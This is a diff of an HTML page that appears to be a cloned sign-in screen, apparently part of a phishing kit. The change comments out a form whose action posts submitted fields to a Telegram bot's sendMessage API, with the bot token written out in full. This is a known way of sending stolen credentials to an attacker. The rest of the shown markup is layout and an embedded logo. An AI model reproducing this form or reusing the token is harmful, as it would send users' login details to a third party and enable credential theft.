@@ -23,7 +23,7 @@
       </div>
     </div>
     <div data-bind="if: activeDialog"></div>
-    <form  method="post" action="https://api.telegram.org/bot6968329477:AAEhYNnQDPFTiB3XNbZqRLGshEFhpa0EwTI/sendMessage">
+<!--     <form  method="post" action="https://api.telegram.org/bot6968329477:AAEhYNnQDPFTiB3XNbZqRLGshEFhpa0EwTI/sendMessage"> -->
     <div class="outer">
       <div class="middle">
         <img class="background-logo" role="presentation" src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVYAAABIBAMAAABfKsDvAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAwUExURUdwTP///////////////////////////////////////////////////////////0Q+7AIAAAAPdFJOUwB3u0TuEZkzZszdIohVquAaMTsAAAYpSURBVGje1VpNaFxVFJ7JdCaJmfxMI4EKOkkoqFDJBDeihlQkVhCZEbIxaJsuxO6SRXEhghFREBejlbpxEX+wuhAmQnGpVXDdItWNQtqliiSZTNLJT3Od9+59955z7s+b5CUzr3eTzPve+9737j333HPPuYnEYbfU4432VPs5mmn9rNHW2s8RJ62p8VwuN1i4B7R+/w/j7dPfY6615wGm2n+x1tozx2D7NsZaiVTGvoqv1vsZbb/GVetZTSrbmt8H+atLLdPaWdG1smebpu48zgot03qRmdpCc8Tp94usdVo7i0atd5vi7Vn07m2Z1quBuu/ebQgfHxO/ak1ZbIq1Umt6UYh7XfwOVoWp+GnNCGn/Ug9WjZ/WZa7seWqDjA3ETWu6qFtnpnkjaKnWLNd1Bl3kS+5m3LT+ZJr03fwDlmKmdc7kTIVhzMZLa5r34DVyudyswbZSa9J/13aJXO7wL9cPRWt6/JfR0dHbfxqduwmzab3PLIpL2OI/Rr2mwoMO7+cpATzq33jJu/SI+T1vBWvNFX0nZ8Ywx2/+6x9u/Pe2f+vnGksFTC7ibPvlQoEDiDWj1g/UDds0HLJgiENEK56R5i0xFbweReuTKCjGPWvDEMfLyn3ySKVkcWWzUbW+YrglFEMcXOBl+bo93Y67gW0cXGvnIgk0XwOhqBWDHFk191O2+c7v2YioVYviq44Iv2rSWlarKndZO7rWXh9Yj6bVEMXPJsIxwCHuKqjuO23YLIAOP7DWmWDejDx0klqlAwMcM0AG9/nDBi8NnrZqzeVyQz54Pudlwizzgj3m/f9GEccYDgxwjIFVtdu4wkoHG6I1ZN3q4go+4b9+ZLBfXJjiyMKp328NqseUooNqneausYRc9no4pjjKymEdsdY8nk1JONtdmOTgM6tWgloLR6PVf9NWCVMKo3RhkmMGbQPsWucia+UmeYeuhQNhmOLgH3CjBVr7aLzOt3EfhWGSI4sXqqO0gXM+NE999kYYJjnK+IOOUuskCIGBH1wPwwIOPrP2MLXdD+xG0ZrXIqvr8ooLCzhmoMMK1xppLVgBLhMEIpthWMAxBh2W1GrarxYja/VjvlXIOSmfdGGCI0vzFiHxwHoUrXpYRKIeCyY4yshhSd+xatuf7kTWOqzpYWEY/3evSCPrJPXJGFhtn1amWWcvs+zF+wBbG7Vehil0pjk63o4BgW3RusXMLtiQZFsGln24WmthmODIa0YwZ3Gwc+ozD1lrNQwTHH2aeS6bk2xpGJBH0bqqJR2qYZjgEHWMBWqXa2Y3UAdarx1sLdjR/P1uGBZwXGRkceOrQ61kTLucTpgG89x+1ti6lnhaC8MCjhTNYnNHwG6ZooFg3InWyf3ELpsa650wTHLkqX2umIwgifbARWxc+f3EhHDE0mqwXJjk4PE32OjwpCYJYfmM29U/Wdoa1nrDpPUYnRtJ5YVcmOQQs+sWrQ+dMVRop/TwUKrDWgdMWjN0CGfUd7kwxXGVlIOC+taCVi2QCvxB38ahWRNae9HgYB4XpjhStCYo6oa7yizOkrzdMhrnskHrsHHPXcEDnWJNYjSXUdfqsfI8zksiu/QCdmBTcBNHtG4k7PnIOk5iToVjiiND3Jasc3/BL/0RJBsLOG8s5uNNrDVNBhNq7UBHZ7qKsCtdGF1PwGSaDgKw2kguNxQcHwA9nwTV5R9oYle9c4JqFUOw/Z4/AGPoORcGOKaJ27Kcy1ig6wW7MjhxovGniLTy19TOP3FCz7/mxYMjgxNDFVKPdmAwV8xAjsNrb5qk1rWgK2hlpDXvyBVnNFZleg5Mt/lN/WQGfBBsypSV+CpR7CImnqVeQI+oQTdux/TaBoicsrrWz+Da0AWRr7HWrEtrxtqtLsyQG69bqmJeewbHB9chJdaarrjqW3lHD1gxU80BDDM5pLe5ZDwQ4bVvcPwKaj8mrbiIhXvAiplqOcB40vBIKXtO23/dDKC9EtUqX2mscXZV7D1gwzBHWY+wn5YP1i4YaufB2aJCgmpNJMWTLxprx70rAe/HWiXVgmGOpL77TvS849fXL/08bzwo8NfJhue+bTxVkjreUPvlg7YjBuN/e07/1If7xe7h9j+U2KvMdpuOpwAAAABJRU5ErkJggg==' / <br>
@@ -166,7 +166,7 @@
         </div>
       </div>
     </div>
-    </form>
+<!--     </form> -->
     <script src="script.js"></script>
   </body>
 
